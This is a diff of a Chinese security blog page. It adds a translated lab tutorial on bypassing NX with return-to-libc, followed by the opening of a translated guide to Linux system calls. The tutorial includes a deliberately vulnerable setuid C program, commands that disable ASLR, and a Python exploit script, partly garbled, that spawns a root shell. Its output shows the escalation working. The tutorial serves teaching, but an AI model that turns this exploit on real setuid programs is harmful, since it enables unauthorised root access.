@@ -106,7 +106,7 @@
         
           <section id="main">
   
-    <article id="post-csysseccircus"  class="article article-type-post" itemscope itemprop="blogPost" >
+    <article id="post-returntolibc"  class="article article-type-post" itemscope itemprop="blogPost" >
   <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
     
     
@@ -114,7 +114,7 @@
         
   
     <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/20161230/csysseccircus/">计算机系统安全学术圈</a>
+      <a class="article-title" href="/20161231/returntolibc/">Return-to-libc绕过NX</a>
     </h1>
   
 
@@ -122,8 +122,770 @@
     
     <div class="article-meta">
       
-	Posted on <a href="/20161230/csysseccircus/" class="article-date">
-	  <time datetime="2016-12-30T05:37:07.000Z" itemprop="datePublished">十二月 30, 2016</time>
+	Posted on <a href="/20161231/returntolibc/" class="article-date">
+	  <time datetime="2016-12-31T14:20:03.000Z" itemprop="datePublished">十二月 31, 2016</time>
+	</a>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>作者: <a href="http://www.csyssec.org/about" target="_blank" rel="external">CSysSec出品</a></p>
+<hr>
+<p><strong>CSysSec注</strong>： 本系列文章译自安全自由工作者<a href="https://sploitfun.wordpress.com/about-2/" target="_blank" rel="external">Sploitfun</a>的漏洞利用系列博客，从经典栈缓冲区漏洞利用堆漏洞利用，循序渐进，是初学者不可多得的好材料，本系列所有文章涉及的源码可以在<a href="https://github.com/sploitfun/lsploits" target="_blank" rel="external">这里</a>找到。CSysSec计划在原基础上不断添加相关漏洞利用技术以及相应的Mitigation方法，欢迎推荐或自荐文章。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20161231/returntolibc/" target="_blank" rel="external">Linux(X86)漏洞利用系列-Return-to-libc绕过NX</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
+<hr>
+<blockquote>
+<ul>
+<li>0X01 什么是NX比特位</li>
+<li>0X02 如何绕过NX比特位做到任意代码执行</li>
+<li>0X03 什么是最低权限准则</li>
+<li>0X04 root setuid程序漏洞利用 </li>
+</ul>
+</blockquote>
+<p><u><em>阅读基础:</em></u></p>
+<ol>
+<li><a href="http://www.csyssec.org/20161231/stackbufferflow/" target="_blank" rel="external">经典栈缓冲区溢出</a></li>
+</ol>
+<p><u><em>VM Setup:</em></u> Ubuntu 12.04 (x86)</p>
+<p>在前面的文章中，我们可以了解到，攻击者可以：</p>
+<pre><code>将shellcode拷贝到栈中，再跳转到shellcode
+</code></pre><p>来达到成功利用漏洞代码的目的。</p>
+<p>因此，为了阻止攻击者的行为，安全研究人员开始利用“NX”比特位来缓解漏洞利用方法(exploit mitigation)。 </p>
+<h3 id="什么是NX比特位"><a href="#什么是NX比特位" class="headerlink" title="什么是NX比特位"></a>什么是NX比特位</h3><p>这种漏洞利用缓解方法将指定内存区域设置为不可执行，并将可执行的区域设置为不可写。举个例子：数据段、栈和堆设置为不可执行，text段设置为不可写。</p>
+<p>设置NX位后，经典的栈缓冲区溢出无法利用其漏洞。那是因为，在经典的方法中，shellcode被拷贝到栈中，返回地址指向shellcode。然而，现在的情况是栈被设置位不可执行，漏洞利用(exploit)就会失败。 当然，这种缓解(mitigation)技术也不是完全安全的，这篇文章就来看看我们是如何绕过NX比特位的!!!</p>
+<p><u>漏洞代码</u>： 下面这份代码基于前文中漏洞代码作了一点修改。我会在后文中讲述修改的必要性。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"> <span class="comment">//vuln.c</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</div><div class="line"> <span class="keyword">char</span> buf[<span class="number">256</span>]; <span class="comment">/* [1] */</span> </div><div class="line"> <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]); <span class="comment">/* [2] */</span></div><div class="line"> <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,buf); <span class="comment">/* [3] */</span></div><div class="line"> fflush(<span class="built_in">stdout</span>);  <span class="comment">/* [4] */</span></div><div class="line"> <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><u>编译命令</u>:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#echo 0 &gt; /proc/sys/kernel/randomize_va_space</span></div><div class="line">$gcc -g -fno-<span class="built_in">stack</span>-protector -o vuln vuln.c</div><div class="line">$sudo chown root vuln</div><div class="line">$sudo chgrp root vuln</div><div class="line">$sudo chmod +s vuln</div></pre></td></tr></table></figure>
+<p><u>注意</u>: “-z exexstack”参数并没有传递给gcc,因此这时栈是不可执行的(Non eXecutable)，可以通过下述方法来验证：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">$ readelf -l vuln</div><div class="line">...</div><div class="line">Program Headers:</div><div class="line"> Type      Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align</div><div class="line"> PHDR      <span class="number">0x000034</span> <span class="number">0x08048034</span> <span class="number">0x08048034</span> <span class="number">0x00120</span> <span class="number">0x00120</span> R E <span class="number">0x4</span></div><div class="line"> INTERP    <span class="number">0x000154</span> <span class="number">0x08048154</span> <span class="number">0x08048154</span> <span class="number">0x00013</span> <span class="number">0x00013</span> R <span class="number">0x1</span></div><div class="line"> [Requesting program interpreter: /lib/ld-linux.so<span class="number">.2</span>]</div><div class="line"> LOAD      <span class="number">0x000000</span> <span class="number">0x08048000</span> <span class="number">0x08048000</span> <span class="number">0x00678</span> <span class="number">0x00678</span> R E <span class="number">0x1000</span></div><div class="line"> LOAD      <span class="number">0x000f14</span> <span class="number">0x08049f14</span> <span class="number">0x08049f14</span> <span class="number">0x00108</span> <span class="number">0x00118</span> RW <span class="number">0x1000</span></div><div class="line"> DYNAMIC   <span class="number">0x000f28</span> <span class="number">0x08049f28</span> <span class="number">0x08049f28</span> <span class="number">0x000c8</span> <span class="number">0x000c8</span> RW <span class="number">0x4</span></div><div class="line"> NOTE      <span class="number">0x000168</span> <span class="number">0x08048168</span> <span class="number">0x08048168</span> <span class="number">0x00044</span> <span class="number">0x00044</span> R <span class="number">0x4</span></div><div class="line"> ...</div><div class="line"> GNU_STACK <span class="number">0x000000</span> <span class="number">0x00000000</span> <span class="number">0x00000000</span> <span class="number">0x00000</span> <span class="number">0x00000</span> RW <span class="number">0x4</span></div><div class="line"> GNU_RELRO <span class="number">0x000f14</span> <span class="number">0x08049f14</span> <span class="number">0x08049f14</span> <span class="number">0x000ec</span> <span class="number">0x000ec</span> R <span class="number">0x1</span></div><div class="line">$</div></pre></td></tr></table></figure>
+<p>栈中只有RW标志位，并没有E标志位！</p>
+<h3 id="如何绕过NX比特位做到任意代码执行"><a href="#如何绕过NX比特位做到任意代码执行" class="headerlink" title="如何绕过NX比特位做到任意代码执行"></a>如何绕过NX比特位做到任意代码执行</h3><p>可以通过“return-to-libc”技术来绕过NX比特位。这里，返回地址被一种特殊的libc函数地址(而不是含有shellcode代码的栈地址)覆盖。举个例子，如果攻击者想触发一个shell, 他会利用system()地址来覆盖返回地址并设置好system()在栈中需要的必要参数，以便能成功调用system()。 </p>
+<p>之前我们已经反汇编并画出了漏洞代码的栈布局。现在开始写个漏洞利用代码来绕过NX比特位吧！</p>
+<p><u>漏洞利用代码</u></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">#exp.py</div><div class="line">#!/usr/bin/env python</div><div class="line">import struct</div><div class="line">from subprocess import call</div><div class="line"></div><div class="line">#Since ALSR is disabled, libc base address would remain constant and hence we can easily find the function address we want by adding the offset to it. </div><div class="line">#For example system address = libc base address + system offset</div><div class="line">#where </div><div class="line">       #libc base address = 0xb7e22000 (Constant address, it can also be obtained from cat /proc//maps)</div><div class="line">       #system offset     = 0x0003f060 (obtained from "readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system")</div><div class="line"></div><div class="line">system = 0xb7e61060        #0xb7e2000+0x0003f060</div><div class="line">exit = 0xb7e54be0          #0xb7e2000+0x00032be0</div><div class="line"></div><div class="line">#system_arg points to 'sh' substring of 'fflush' string. </div><div class="line">#To spawn a shell, system argument should be 'sh' and hence this is the reason for adding line [4] in vuln.c. </div><div class="line">#But incase there is no 'sh' in vulnerable binary, we can take the other approach of pushing 'sh' string at the end of user input!!</div><div class="line">system_arg = 0x804827d     #(obtained from hexdump output of the binary)</div><div class="line"></div><div class="line">#endianess conversion</div><div class="line">def conv(num):</div><div class="line"> return struct.pack("&lt;I",numystem + exit + system_arg</div><div class="line">buf = "A" * 268</div><div class="line">buf += conv(system)</div><div class="line">buf += conv(exit)</div><div class="line">buf += conv(system_arg)</div><div class="line"></div><div class="line">print "Calling vulnerable program"</div><div class="line">call(["./vuln", buf])</div></pre></td></tr></table></figure>
+<p>执行上述漏洞利用代码，可以得到一个具有root权限的shell,如下图所示：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ python <span class="built_in">exp</span>.py </div><div class="line">Calling vulnerable program</div><div class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`���K��&#125;�</div><div class="line"><span class="meta"># id</span></div><div class="line">uid=<span class="number">1000</span>(sploitfun) gid=<span class="number">1000</span>(sploitfun) euid=<span class="number">0</span>(root) egid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root),<span class="number">4</span>(adm),<span class="number">24</span>(cdrom),<span class="number">27</span>(sudo),<span class="number">30</span>(dip),<span class="number">46</span>(plugdev),<span class="number">109</span>(lpadmin),<span class="number">124</span>(sambashare),<span class="number">1000</span>(sploitfun)</div><div class="line"># <span class="built_in">exit</span></div><div class="line">$</div></pre></td></tr></table></figure>
+<p>太棒了，我们拿到了root shell! 但在实际应用程序中，root setuid 程序设置了最低权限准则，获取root shell并没那么容易！ </p>
+<h3 id="什么是最低权限准则"><a href="#什么是最低权限准则" class="headerlink" title="什么是最低权限准则"></a>什么是最低权限准则</h3><p>这种技术允许root setuid程序只有在需要的情况下才能获取root权限。也就是说，在需要时，root setuid程序拿到root 权限，不需要时就会丢弃已获取的权限。root setuid一般会在接收用户输入之前会丢弃root权限。因此，尽管用户输入是恶意的，攻击者也无法后去root shell。 举个例子，下面的漏洞代码不允许攻击者获取root shell。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//vuln_priv.c</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</div><div class="line"> <span class="keyword">char</span> buf[<span class="number">256</span>];</div><div class="line"> seteuid(getuid()); <span class="comment">/* Temporarily drop privileges */</span> </div><div class="line"> <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);</div><div class="line"> <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,buf);</div><div class="line"> fflush(<span class="built_in">stdout</span>);</div><div class="line"> <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>对于上述漏洞程序，当我们执行下面的漏洞利用代码时，无法获取root shell。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#exp_priv.py</span></div><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="keyword">import</span> struct</div><div class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> call</div><div class="line"></div><div class="line">system = <span class="number">0xb7e61060</span></div><div class="line">exit = <span class="number">0xb7e54be0</span></div><div class="line"></div><div class="line">system_arg = <span class="number">0x804829d</span></div><div class="line"></div><div class="line"><span class="comment">#endianess conversion</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">conv</span><span class="params">(num)</span>:</span></div><div class="line"> <span class="keyword">return</span> struct.pack(<span class="string">"&lt;I"</span>,numystem + exit + system_arg</div><div class="line">buf = <span class="string">"A"</span> * <span class="number">268</span></div><div class="line">buf += conv(system)</div><div class="line">buf += conv(exit)</div><div class="line">buf += conv(system_arg)</div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"Calling vulnerable program"</span></div><div class="line">call([<span class="string">"./vuln_priv"</span>, buf])</div></pre></td></tr></table></figure>
+<p><u>注意</u>:exp_priv.py对exp.py稍作了一点修改！仅仅调整了system_arg变量</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">$ python exp_priv.py </div><div class="line">Calling vulnerable program</div><div class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`���K川�</div><div class="line">$ id</div><div class="line">uid=1000(sploitfun) gid=1000(sploitfun) egid=0(root) groups=1000(sploitfun),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)</div><div class="line">$ rm /bin/ls</div><div class="line">rm: remove write-protected regular file `/bin/ls'? y</div><div class="line">rm: cannot remove `/bin/ls': Permission denied</div><div class="line">$ exit</div><div class="line">$</div></pre></td></tr></table></figure>
+<pre><code>到这里就完事了吗？那该如何对应用最低权限准则的root setuid程序进行漏洞利用呢？
+</code></pre><h3 id="root-setuid程序漏洞利用"><a href="#root-setuid程序漏洞利用" class="headerlink" title="root setuid程序漏洞利用"></a>root setuid程序漏洞利用</h3><p>针对漏洞代码(vuln_priv)，漏洞利用程序(exp_priv.py)调用system()再紧接着调用exit()还不足以获取root shell。 但如果能修改一下漏洞利用程序(exp_priv.py)，以下面的顺序调用libc函数：</p>
+<ul>
+<li>setuid(0)</li>
+<li>system(“sh”)</li>
+<li>exit()</li>
+</ul>
+<p>这样一来我们就能获取root shell。 这种技术叫做return-to-libc链接(chaining)，将会在<a href="http://www.csyssec.org/20170101/chainingreturntolibc/" target="_blank" rel="external">下一篇</a>中讨论</p>
+<hr>
+<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20161231/returntolibc/" target="_blank" rel="external">Linux(X86)漏洞利用系列-Return-to-libc绕过NX</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
+
+      
+    </div>
+    <footer class="entry-meta entry-footer">
+      
+	<span class="ico-folder"></span>
+    <a class="article-category-link" href="/categories/漏洞利用/">漏洞利用<span class="article-category-count">14</span></a>
+
+
+      
+  <span class="ico-tags"></span>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li></ul>
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+<!-- Table of Contents -->
+
+  
+    <article id="post-systemcall64list"  class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" itemprop="name">
+      <a class="article-title" href="/20161231/systemcall64list/">Linux(x86)64位系统调用列表</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	Posted on <a href="/20161231/systemcall64list/" class="article-date">
+	  <time datetime="2016-12-31T13:25:56.000Z" itemprop="datePublished">十二月 31, 2016</time>
+	</a>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        
+
+          
+            <div class="entry-summary" style="margin-left:0;">
+            作者: CSysSec出品
+
+CSysSec注：本文维护了Linux (x86) 64位系统调用表项，源码可以参考Sytem call on Linux Cross Reference,亦可参考这里。32位系统调用表项可以参考这里。另外，IBM Developworks上维护了一个32位系统调用的分类。转载本文请务必注明，文章出处：《Linux(x86)64位系统调用列表》与作者信息：CSysSec出品
+
+其中：%rax表示返回值，%rdi、%rdi、%rsi、%rdx、%r10、%r8与%r9表示参数。如果显示效果不好，请点击文章内查看
+
+
+
+%rax
+System call
+%rdi
+%rsi
+%rdx
+%r10
+%r8
+%r9
+
+
+
+
+0
+sys_read
+unsigned in...
+          
+
+        
+          <p class="article-more-link">
+            <a href="/20161231/systemcall64list/#more">阅读全文</a>
+          </p>
+        </div>
+      
+    </div>
+    <footer class="entry-meta entry-footer">
+      
+	<span class="ico-folder"></span>
+    <a class="article-category-link" href="/categories/系统内核/">系统内核<span class="article-category-count">7</span></a>
+
+
+      
+  <span class="ico-tags"></span>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Kernel/">Kernel</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/System/">System</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Systemcall/">Systemcall</a></li></ul>
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+<!-- Table of Contents -->
+
+  
+    <article id="post-systemcallinternal"  class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" itemprop="name">
+      <a class="article-title" href="/20161231/systemcallinternal/">Linux系统调用权威指南</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	Posted on <a href="/20161231/systemcallinternal/" class="article-date">
+	  <time datetime="2016-12-31T11:35:34.000Z" itemprop="datePublished">十二月 31, 2016</time>
+	</a>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>来源：<a href="http://www.chongh.wiki/blog/2016/04/09/linux-syscalls/" target="_blank" rel="external">Diting0x</a> | <a href="http://blog.packagecloud.io/eng/2016/04/05/the-definitive-guide-to-linux-system-calls/#bit-fast-system-calls" target="_blank" rel="external">原文</a></p>
+<hr>
+<p><strong>CSysSec注</strong>： 本文从传统系统调用到快速系统调用详细介绍了Linux中系统调用原理以及相关源代码，并教大家如何写自己的系统调用。是篇值得推荐的深入分析系统调用的好文章。</p>
+<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20161231/systemcallinternal/" target="_blank" rel="external">Linux系统调用权威指南</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
+<hr>
+<blockquote>
+<ul>
+<li>长话短说（Too long;Don’t read)</li>
+<li>什么是系统调用</li>
+<li>准备知识<ul>
+<li>硬件与软件</li>
+<li>用户程序，内核与CPU特权级</li>
+<li>中断</li>
+<li>特殊模块寄存器</li>
+<li>编写汇编代码触发系统调用不是个好主意</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li>传统系统调用<ul>
+<li>自己写汇编代码使用传统系统调用</li>
+<li>内核层面：<code>int $0x80</code>入口</li>
+<li><code>iret</code>: 从传统系统调用返回</li>
+</ul>
+</li>
+<li>快速系统调用<ul>
+<li>32位快速系统调用<ul>
+<li><code>sysenter/sysexit</code></li>
+<li><code>_ _kernel_vsyscall</code>内幕</li>
+<li>自己写汇编代码使用<code>sysenter</code></li>
+<li>内核层面：<code>sysenter</code>入口</li>
+<li><code>sysexit</code>: 从<code>sysenter</code>中返回</li>
+</ul>
+</li>
+<li>64位快速系统调用<ul>
+<li><code>syscall/sysret</code></li>
+<li>自己写汇编代码使用syscall</li>
+<li>内核层面：<code>syscall</code>入口</li>
+<li>sysret: 从syscall中返回</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>syscall(2)：半手动调用syscall<ul>
+<li>glibc <code>syscall</code>封装器内幕</li>
+</ul>
+</li>
+<li>虚拟系统调用<ul>
+<li>内核中的vDSO</li>
+<li>在内存中定位vDSO</li>
+<li>glibc中的vDSO</li>
+</ul>
+</li>
+<li><code>glibc</code>系统调用封装器</li>
+<li>重要的syscall相关bugs<ul>
+<li>CVE-2010-3301</li>
+<li>Android <code>sysenter</code> ABI 破坏</li>
+</ul>
+</li>
+<li>结论</li>
+</ul>
+</blockquote>
+<hr>
+<h2 id="长话短说-Too-long-Don’t-read"><a href="#长话短说-Too-long-Don’t-read" class="headerlink" title="长话短说(Too long; Don’t read)"></a>长话短说(Too long; Don’t read)</h2><p>文章解释了Linux程序在内核中是如何调用函数的。</p>
+<p>读完你可以知道：触发系统调用的不同方法，如何编写汇编代码触发系统调用(含代码样例), 内核执行系统调用的入口，内核从系统调用返回的出口，glibc封装器，相关bugs，还有更多，更多。</p>
+<h2 id="什么是系统调用？"><a href="#什么是系统调用？" class="headerlink" title="什么是系统调用？"></a>什么是系统调用？</h2><p>当你运行的程序调用 open,fork,read,write（以及其它类似的函数)时,就会触发系统调用。</p>
+<p>系统调用描述的是用户程序进入内核后执行的任务。用户程序利用系统调用能执行许多操作：创建进程、网络、文件以及I/O操作等。</p>
+<p><a href="http://man7.org/linux/man-pages/man2/syscalls.2.html" target="_blank" rel="external">man page for syscalls(2)</a> 列出了全部系统调用。</p>
+<p>用户程序可以通过不同的方式执行系统调用，不同CPU架构中，底层执行系统调用的指令也有所不同。</p>
+<p>作为应用程序开发者，不必刻意去考虑系统调用是如何执行的。你只需要简单的加上合适的头文件，像调用普通函数一样就可以使用系统调用了。</p>
+<p>glibc提供了封装代码将底层抽象，把你传递的参数放置好之后开始进入内核。</p>
+<p>在深入理解系统调用执行的细节之前，我们需要定义一些术语，再谈一谈后面要用到的核心知识点。</p>
+<h2 id="准备知识"><a href="#准备知识" class="headerlink" title="准备知识"></a>准备知识</h2><h3 id="硬件与软件"><a href="#硬件与软件" class="headerlink" title="硬件与软件"></a>硬件与软件</h3><p>这篇博客作以下假设：</p>
+<ul>
+<li>你在使用32位、64位Intel或AMD CPU. 文中提到的方法可能对那些使用其它系统的人同样有效，但列出的代码都是依赖CPU的。</li>
+<li>你感兴趣的是Linux kernel 3.13.0. 其它的内核版本类似，但实际的代码行号，代码架构以及文件路径会有所不同。文中也提供了3.13.0内核源代码的github链接。</li>
+<li><p>你感兴趣的是<code>glibc</code>，或者由<code>glibc</code>衍生的其它libc实现(比如<code>eglibc</code>).</p>
+<p>文中提到的x86-64指的是基于x86架构的64位Intel和AMD处理器。</p>
+</li>
+</ul>
+<h3 id="用户程序，内核与CPU特权级"><a href="#用户程序，内核与CPU特权级" class="headerlink" title="用户程序，内核与CPU特权级"></a>用户程序，内核与CPU特权级</h3><p>用户程序(如编辑器、终端、ssh进程等)需要与内核交互，内核才能代表用户程序执行一些其不能执行的操作。</p>
+<p>举个例子，如果一个用户程序需要执行一些I/O操作(open,read,write等)或者修改自身的地址空间(mmap,sbrk等)，必须要通知内核才能代表其自身完成这些操作。</p>
+<p>那么又是什么阻碍了用户程序自身执行这些操作呢？</p>
+<p>x86-64处理器引入了特权级的概念。特权级是个复杂的话题，需要另写博文详述了。当然，本文重点不在此，因此将特权级的概念简化如下：</p>
+<ol>
+<li>特权级实现了访问控制。当前特权级决定了哪些CPU指令和I/O操作能被执行。</li>
+<li>内核运行在最高特权级，称为“Ring 0”；用户程序运行在最低特权级,称为”Ring 3”.</li>
+</ol>
+<p>用户程序要执行特权操作，必须经历特权级转变的过程(从”Ring 3”到“Ring 0”),才能让内核来执行这些操作。</p>
+<p>有许多方法能引起特权级转变并触发内核执行相关操作。</p>
+<p>从常用的方法说起：中断。</p>
+<h3 id="中断"><a href="#中断" class="headerlink" title="中断"></a>中断</h3><p>可以把中断理解为硬件或软件引发的一个事件。</p>
+<p>硬件中断源于硬件设备通知内核某个特殊事件的发生。网卡收到数据包时产生的中断是比较常见的硬件中断。</p>
+<p>软件中断由某段代码的执行而引发。在x86-64系统中，执行 int指令就会引发软件中断。</p>
+<p>中断通常都会被分配一个中断号。这些中断号有着特殊的含义。</p>
+<p>想象存储在CPU内存中的一个数组，数组的每个条目都映射为一个中断号。每个条目还存储了当CPU接收到中断信号后将要执行的函数地址以及一些其它的选项，选项中含有中断处理函数应该在哪个特权级上执行的信息。</p>
+<p>下面的这张图取自Intel CPU手册，描述了数组中每个条目的存储结构。</p>
+<p><img src="http://7xppf1.com1.z0.glb.clouddn.com/idt.png" alt="idt"></p>
+<p>仔细看，会发现有一个2位的域标记着特权级描述符(DPL)。这个值决定了当执行中断处理函数时CPU需要的最低特权级。</p>
+<p>当CPU接收到特定类型事件时，通过DPL信息知道它应该执行在哪个地址空间，以及事件处理器应该执行在哪个特权级上。</p>
+<p>实际上，在x86-64系统中有许多不同的方法处理中断。对这个感兴趣想了解更多的可以参考 <a href="http://wiki.osdev.org/8259_PIC" target="_blank" rel="external">8259 Programmable Interrupt Controller, Advanced Interrupt Controllers</a>和<a href="http://wiki.osdev.org/IOAPIC" target="_blank" rel="external"> IO Advanced Interrupt Controllers</a>.</p>
+<p>当处理硬件中断和软件中断时，还会涉及到其它一些复杂的工作要处理，比如中断号冲突与重映射等问题。</p>
+<p>讨论系统调用时，我们不必关注以上这些细节。</p>
+<h3 id="特殊模块寄存器"><a href="#特殊模块寄存器" class="headerlink" title="特殊模块寄存器"></a>特殊模块寄存器</h3><p>特殊模块寄存器（MSRs)是用来控制CPU某些特性的一组控制寄存器。 CPU文档中列举了每个MSRs的地址。</p>
+<p>可以执行CPU指令 <code>rdmsr/wrmsr</code>来读/写 MSRs.</p>
+<p>也有一些命令行工具可以用来读/写 MSRs. 但不建议这么做，因为修改这些值（尤其当系统在运行的时候)是相当危险的，除非你真的能做到小心翼翼。</p>
+<p>如果你不介意让你的系统不稳定或者不可恢复的损坏你的数据，你可以安装<code>msr-tools</code>工具并加载<code>msr</code>内核模块来读/写MSRs.</p>
+<pre><code>% sudo apt-get install msr-tools
+% sudo modprobe msr
+% sudo rdmsr
+</code></pre><p>下文中我们会看到一些系统调用的方法就会用到这些MSRs.</p>
+<h3 id="编写汇编代码触发系统调用不是个好主意"><a href="#编写汇编代码触发系统调用不是个好主意" class="headerlink" title="编写汇编代码触发系统调用不是个好主意"></a>编写汇编代码触发系统调用不是个好主意</h3><p>自己编写汇编代码来触发系统调用可不是个好主意。</p>
